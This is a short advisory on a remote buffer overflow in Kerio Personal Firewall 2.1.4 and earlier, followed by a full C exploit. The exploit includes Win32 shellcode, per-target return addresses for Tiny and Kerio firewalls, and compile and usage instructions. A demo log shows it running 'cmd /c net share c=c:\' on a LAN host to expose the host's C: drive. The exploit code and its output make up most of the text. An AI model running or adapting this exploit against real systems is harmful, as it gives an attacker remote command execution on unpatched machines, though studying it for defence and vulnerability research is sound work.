source: http://www.securityfocus.com/bid/7180/info
 
A buffer-overflow vulnerability has been discovered in Kerio Personal Firewall. The problem occurs during the administration authentication process. An attacker could exploit this vulnerability by forging a malicious packet containing an excessive data size. The application then reads this data into a static memory buffer without first performing sufficient bounds checking.
 
Successful exploits of this vulnerability may allow an attacker to execute arbitrary commands on a target system, with the privileges of the firewall.
 
Note that this vulnerability affects Kerio Personal Firewall 2.1.4 and earlier.

/**************************************************************
 * Personal Firewall Engine remote buffer overflow Exploit
 **************************************************************
 *
 * Original information shared by CORE Security Technologies.
 * ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 * http://www.coresecurity.com/common/showdoc.php?idx=314&idxseccion=10
 * ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 * Released : 30/04/2003
 *
 * Coded By ThreaT.
 * ThreaT@Ifrance.com
 * http://s0h.cc/~threat
 *
 ********************************************************************
 *
 * This exploit take advantage of the vulnerability discovered by
 * CORE Security Technologies for execute a command on remote workstations
 * equiped with the fallowing PSW :
 *
 * - Tiny Personal Firewall 2.0.15
 * - Kerio Personal Firewall 2.1.4
 *
 *********************************************************************
 *
 * Usage : PFExploit.exe <target> <victim_ip> <command to execute>
 *
 * =====================================================================
 * !! compile with : cl.exe /nologo PFExploit.c /link wsock32.lib !!
 * =====================================================================
 */


#include <windows.h>
#include <winsock.h>

#define len 0x1494

void main (int argc, char *argv[])
{
	SOCKET sock1;
	SOCKADDR_IN sin;
	int i;
	DWORD byte = htonl(len);

	char buffer[len], *p,

	shellcode[] = 

	"\xEB\x69\x6A\x30\x5B\x64\x8B\x03\x8B\x40\x0C\x8B\x48\x0C\x8B\xC1" 
	"\x8B\x70\x30\x80\x3E\x4B\x75\x4A\x8B\x40\x18\x8B\x58\x3C\x03\xD8" 
	"\x8B\x5B\x78\x03\xD8\x8B\x73\x1C\x03\xF0\x56\x8B\x73\x24\x03\xF0" 
	"\x56\x8B\x53\x20\x03\xD0\x8B\x5B\x18\x4B\x8B\x34\x9A\x03\xF0\x03" 
	"\x74\x24\x10\x8B\x36\x39\x74\x24\x0C\x74\x08\x4B\x23\xDB\x75\xEA" 
	"\x58\x58\xC3\x5F\x33\xC9\x66\x8B\x0C\x5F\x5F\x8B\x3C\x8F\x8D\x04" 
	"\x07\xC3\x8B\x18\x39\x08\x8B\xC3\x75\xA6\xC3\xEB\x22\x6A\x01\x68" 
	"\x69\x6E\x45\x78\xE8\x89\xFF\xFF\xFF\x6A\x01\xFF\x74\x24\x0C\xFF" 
	"\xD0\x6A\x01\x68\x78\x69\x74\x50\xE8\x75\xFF\xFF\xFF\xFF\xD0\xE8"
	"\xD9\xFF\xFF\xFF";

	WSADATA wsadata;
	WORD wVersionRequested = MAKEWORD (2,0);

	struct _target {

		char Name[4];
		char *RetAddr;
		char *App;

	} targ[2] = {

		{"TPF" , "\xED\xEA\x2F\x01", "Tiny Personal Firewall 2.0.15"},
		{"KPF" , "\xF8\xEA\x61\x01", "Kerio Personal Firewall 2.1.4"},
	};
	

printf ("#############################################################\n"
	"Personal Firewall Engine, Remote buffer overflow Exploit !\n"
	"#############################################################\n"
	"Discovered by CORE Security Technologies & Coded by ThreaT\n-\n"
	"ThreaT@Ifrance.com\n"
	"http://s0h.cc/~threat\n-\n\n");
	
	if (argc < 4)
	{
		printf ("usage : PFExploit.exe <target> <victim_ip> <command to execute>\n\n"
			"TARGET ARE\n"
			"__________\n\n"
			"TPF : for Tiny Personal Firewall 2.0.15\n"
			"KPF : for Kerio Personal Firewall 2.1.4\n\n");

		ExitProcess (0);
	}

	if (!(p = (char *) LocalAlloc (LPTR,(strlen (shellcode)+strlen(argv[3])+3))))
	{
		printf ("error, cannot allocate memory\n");
		ExitProcess (0);
	}


	memset (buffer,0x90,len);

	strcpy (p,shellcode);
	lstrcat (p,argv[3]);
	memcpy (&buffer[200],p,strlen (p)+1);

	for (i=0; i < 2 ; i++)
		if (!lstrcmpi (argv[1],targ[i].Name)) break;

	if (i > 1)
	{
		printf ("Erreur : la cible %s est inconnue\n",argv[1]);
		ExitProcess (0);
	}


	if (WSAStartup(wVersionRequested, &wsadata)) 
	{
		printf ("Erreur d'initialisation Winsock\n");
		ExitProcess (0);
	}

	
	sin.sin_family = AF_INET;
	sin.sin_addr.s_addr=inet_addr (argv[2]);
	sin.sin_port = htons (44334);


	memcpy (&buffer[0x1490],targ[i].RetAddr,4);

	printf ("Cible : %s\n\n"
		    "Connecting to %s...", targ[i].App, argv[2]);
	
	sock1 = socket (AF_INET, SOCK_STREAM, 0);
	bind (sock1, (SOCKADDR *)&sin, sizeof (sin));
	if ( connect (sock1,(SOCKADDR *)&sin, sizeof (sin)) )
	{
		printf ("connexion failed !\n");
		ExitProcess (0);
	}

	printf ("ok!\n\n"
		    "sending crash for remote execution of '%s'...",argv[3]);
	
	Sleep (1000);
	send (sock1,(const char FAR *)(DWORD)&byte,sizeof (DWORD),0);
	send (sock1,buffer,len,0);

	puts ("ok");

}

/* DEMO ON MY LAN *

D:\code\exploits\kerio>ipconfig

Configuration IP de Windows 2000

Ethernet carte Connexion au r?seau local 2?:

        ?tat du media . . . . . . . . . . : C?ble D?connect?

Ethernet carte Connexion au r?seau local?:

        Suffixe DNS sp?c. ? la connexion. : ThreaT.lan
        Adresse IP. . . . . . . . . . . . : 10.0.0.1
        Masque de sous-r?seau . . . . . . : 255.0.0.0
        Passerelle par d?faut . . . . . . : 10.0.0.138

D:\code\exploits\kerio>net view \\10.0.0.3
La liste est vide.


D:\code\exploits\kerio>PFExploit TPF 10.0.0.3 "cmd /c net share c=c:\"
#############################################################
Personal Firewall Engine, Remote buffer overflow Exploit !
#############################################################
Discovered by CORE Security Technologies & Coded by ThreaT
-
ThreaT@Ifrance.com
http://s0h.cc/~threat
-

Cible : Tiny Personal Firewall 2.0.15

Connecting to 10.0.0.3...ok!

sending crash for remote execution of 'cmd /c net share c=c:"'...ok

D:\code\exploits\kerio>net view \\10.0.0.3
Ressources partag?es de \\10.0.0.3



Nom          Type         Local    Remarque

-------------------------------------------------------------------------------
c            Disque
La commande s'est termin?e correctement.


D:\code\exploits\kerio>

* EOF */